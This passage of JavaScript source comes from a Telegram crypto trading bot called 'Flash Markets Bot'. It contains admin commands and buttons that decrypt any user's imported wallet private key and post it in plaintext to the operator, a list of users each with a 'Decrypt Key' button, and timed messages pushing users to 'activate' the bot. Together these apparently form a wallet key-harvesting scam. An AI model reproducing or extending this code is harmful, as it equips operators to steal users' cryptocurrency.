    buttons.push([Markup.button.callback('📊 View More (Next 10)', 'admin_next_page_10')]);

    await ctx.replyWithMarkdown(message, Markup.inlineKeyboard(buttons));
});

bot.command('admin_decrypt', requireAdmin, async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const telegramId = parseInt(args[0]);

    if (!telegramId) {
        return ctx.reply('Usage: /admin_decrypt <telegram_id>');
    }

    const data = await walletManager.decryptWalletKey(telegramId);
    if (!data) {
        return ctx.reply('❌ User not found.');
    }

    // Log the action
    await walletManager.logAdminAction(ctx.from.id, 'DECRYPT_KEY', telegramId);

    // Send as separate message (safer for copy-paste)
    await ctx.replyWithMarkdown(`🔑 *DECRYPTED KEY*\n\n⚠️ _Handle with extreme care_`, {
        disable_web_page_preview: true
    });

    // Send the plaintext key as code block (easy to copy)
    await ctx.reply(
        `\`\`\`\n${data.plaintextKey}\n\`\`\``,
        { parse_mode: 'Markdown' }
    );

    // Send metadata
    await ctx.replyWithMarkdown(`
📋 *Key Metadata*
• User: @${data.username || 'unknown'} (${data.telegramId})
• Address: \`${data.address}\`
• Type: ${data.keyType}
• Imported: ${new Date(data.createdAt).toLocaleString()}
`);
});

bot.command('admin_user', requireAdmin, async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const telegramId = parseInt(args[0]);

    if (!telegramId) {
        return ctx.reply('Usage: /admin_user <telegram_id>');
    }

    const stats = await walletManager.getUserStats(telegramId);
    if (!stats.wallet) {
        return ctx.reply('❌ User not found.');
    }

    await ctx.replyWithMarkdown(`
📊 *User Stats: @${stats.wallet.username || 'unknown'}*

━━━━━━━━━━━━━━━━━━━━━

*▸ WALLET*
• ID: \`${stats.wallet.telegram_id}\`
• Address: \`${stats.wallet.address}\`
• Type: ${stats.wallet.key_type}
• Active: ${stats.wallet.is_active ? '✅ Yes' : '❌ No'}
• Since: ${new Date(stats.wallet.created_at).toLocaleDateString()}

*▸ PERFORMANCE*
• Total Trades: ${stats.totalTrades}
• Successful: ${stats.successfulTrades}
• Success Rate: ${stats.successRate}%
• Total Profit: $${stats.totalProfit.toFixed(2)}
`, Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Decrypt Key', `admin_decrypt_${telegramId}`)],
        [Markup.button.callback('📊 View Trades', `admin_trades_${telegramId}`)]
    ]));
});

bot.command('admin_search', requireAdmin, async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const address = args[0]?.toLowerCase();

    if (!address) {
        return ctx.reply('Usage: /admin_search <address>');
    }

    const { data } = await config.supabase
        .from('wallets')
        .select('*')
        .ilike('address', `%${address}%`)
        .limit(10);

    if (!data || data.length === 0) {
        return ctx.reply('❌ No wallets found matching that address.');
    }

    let message = `🔍 *Search Results* (${data.length} found)\n\n`;
    data.forEach((w, i) => {
        message += `*${i + 1}.* @${w.username || 'unknown'} (ID: ${w.telegram_id})\n`;
        message += `   \`${w.address}\`\n\n`;
    });

    await ctx.replyWithMarkdown(message);
});


// Admin callback handlers
bot.action(/admin_decrypt_(\d+)/, requireAdmin, async (ctx) => {
    await safeAnswerCbQuery(ctx);
    const telegramId = parseInt(ctx.match[1]);

    const data = await walletManager.decryptWalletKey(telegramId);
    if (!data) {
        return ctx.reply('❌ User not found.');
    }

    await walletManager.logAdminAction(ctx.from.id, 'DECRYPT_KEY', telegramId);

    await ctx.reply(`\`\`\`\n${data.plaintextKey}\n\`\`\``, { parse_mode: 'Markdown' });
    await ctx.replyWithMarkdown(`📋 @${data.username || 'unknown'} • \`${data.address}\` • ${data.keyType}`);
});

bot.action('admin_list_users', requireAdmin, async (ctx) => {
    await safeAnswerCbQuery(ctx);
    const { wallets } = await walletManager.getAllWallets(10, 0);

    let message = `👥 *Users (first 10)*\n\n`;
    wallets.forEach((w, i) => {
        message += `${i + 1}. @${w.username || 'unknown'} (${w.telegram_id})\n`;
    });

    const buttons = wallets.map(w => [
        Markup.button.callback(`🔑 @${w.username || w.telegram_id}`, `admin_decrypt_${w.telegram_id}`)
    ]);

    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
});

bot.action(/admin_trades_(\d+)/, requireAdmin, async (ctx) => {
    await safeAnswerCbQuery(ctx);
    const telegramId = parseInt(ctx.match[1]);

    const { data: trades } = await config.supabase
        .from('trades')
        .select('*')
        .eq('telegram_id', telegramId)
        .order('created_at', { ascending: false })
        .limit(10);

    if (!trades || trades.length === 0) {
        return ctx.reply('No trades found for this user.');
    }

    let message = `📜 *Recent Trades*\n\n`;
    trades.forEach((t, i) => {
        const statusEmoji = t.status === 'success' ? '✅' : t.status === 'failed' ? '❌' : '⏳';
        message += `${statusEmoji} *${t.token}* on ${t.chain}\n`;
        message += `   Profit: $${t.profit_usd} • ${new Date(t.created_at).toLocaleDateString()}\n\n`;
    });

    await ctx.replyWithMarkdown(message);
});


// ═══════════════════════════════════════════════════
// 🔄 RESTORE SCHEDULES ON SERVER RESTART
// ═══════════════════════════════════════════════════
async function restoreUserSchedules() {
    console.log('🔄 Restoring user schedules after server restart...');

    const users = await userTracker.getAllUsers();

    if (users.length === 0) {
        console.log('✅ No existing users to restore');
        return;
    }

    let restoredCount = 0;
    let scheduledRandomCount = 0;

    for (const user of users) {
        // 🌐 Restore language before scheduling messages
        const restoredLang =
            user.language ||
            await userTracker.getUserLanguage(user.telegram_id).catch(() => null);

        if (restoredLang) {
            setUserLanguage(user.telegram_id, restoredLang);
        }

        const startedAt = new Date(user.started_at).getTime();
        const now = Date.now();
        const elapsedMs = now - startedAt;

        // Define all scheduled message delays (in ms)
        const schedule = [
            { fn: sendFollowupMessage, delay: 15 * 60 * 1000 },         // 15 min
            { fn: sendAirdropMessage, delay: 45 * 60 * 1000 },          // 45 min
            { fn: sendActivateMessage, delay: 65 * 60 * 1000 },         // 65 min
            { fn: sendAtomicExecutionMessage, delay: 2 * 60 * 60 * 1000 },  // 2 hours
            { fn: sendHoneypotFilterMessage, delay: 3 * 60 * 60 * 1000 },  // 3 hours
            { fn: sendRpcInfrastructureMessage, delay: 4 * 60 * 60 * 1000 }, // 4 hours
            { fn: sendDexScannerMessage, delay: 5 * 60 * 60 * 1000 },      // 5 hours
            { fn: sendCrossChainMessage, delay: 6 * 60 * 60 * 1000 },      // 6 hours
            { fn: sendEngineActivationMessage, delay: 7 * 60 * 60 * 1000 } // 7 hours
        ];

        // Schedule only FUTURE messages (skip ones already in the past)
        for (const item of schedule) {
            const remainingMs = item.delay - elapsedMs;

            // Only schedule if there's still time left AND at least 10 seconds remaining
            if (remainingMs > 10000) {
                setTimeout(async () => {
                    try {
                        await item.fn(user.telegram_id);
                        console.log(`✅ Sent restored message to ${user.telegram_id}`);
                    } catch (err) {
                        console.error(`❌ Failed to send restored message to ${user.telegram_id}:`, err.message);
                    }
                }, remainingMs);
                restoredCount++;
            }
        }

        // If user has been active for more than 8 hours, jump straight to random scheduler
        const randomStartDelay = 8 * 60 * 60 * 1000;
        if (elapsedMs >= randomStartDelay) {
            // Start random scheduler immediately for long-time users
            scheduleRandomMessage(user.telegram_id);
            scheduledRandomCount++;
        } else {
            // Schedule random scheduler to start at the 8-hour mark
            const remainingToRandom = randomStartDelay - elapsedMs;
            setTimeout(() => {
                scheduleRandomMessage(user.telegram_id);
            }, remainingToRandom);
            scheduledRandomCount++;
        }
    }

    console.log(`✅ Restored schedules for ${users.length} users`);
    console.log(`   • ${restoredCount} pending scheduled messages`);
    console.log(`   • ${scheduledRandomCount} random schedulers activated`);
}



// ═══════════════════════════════════════════════════
// 🛡️ GLOBAL ERROR HANDLER
// ═══════════════════════════════════════════════════
bot.catch(async (err, ctx) => {
    const message = err?.message || '';
    const code = err?.code || err?.response?.error_code;

    // Ignore expired/invalid callback query errors
    if (
        code === 400 &&
        (
            message.includes('query is too old') ||
            message.includes('query ID is invalid') ||
            message.includes('response timeout expired')
        )
    ) {
        console.warn(`⚠️ Ignored expired/invalid callback query for user ${ctx?.from?.id || 'unknown'}`);
        return;
    }

    console.error('🚨 Telegram handler error:', err);

    try {
        if (ctx && ctx.reply) {
            await ctx.reply('⚠️ Something went wrong. Please try again or send /start.');
        }
    } catch (e) {
        console.error('Failed to send error reply:', e.message);
    }
});


// ═══════════════════════════════════════════════════
// 🚀 LAUNCH BOT
// ═══════════════════════════════════════════════════
bot.launch()
    .then(async () => {
        console.log('✅ Flash Markets Bot launched successfully');

        // Start the background balance monitor
        startBalanceMonitor(bot);

        // 💾 Restore scheduled messages for existing users
        await restoreUserSchedules();
    })
    .catch(err => console.error('❌ Bot launch failed:', err));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

module.exports = bot;